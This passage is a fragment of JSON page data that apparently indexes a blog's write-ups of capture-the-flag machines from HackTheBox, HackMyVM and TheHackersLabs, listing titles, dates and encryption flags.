Voleur","title":"HackTheBox - Machine - Voleur","date":"2025-07-07","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Machine - RustyKey","date":"2025-06-30","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackMyVMKrustykrab","title":"HackMyVM - Krustykrab","date":"2025-04-18","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackMyVMSoc1","title":"HackMyVM - Soc1","date":"2025-11-04","isEncrypted":false,"year":"2025","month":"11","day":"04"},{"id":"TheHackersLabsZAPP","title":"TheHackersLabs - ZAPP","date":"2025-11-02","isEncrypted":false,"year":"2025","month":"11","day":"02"}]},"__N_SSG":true}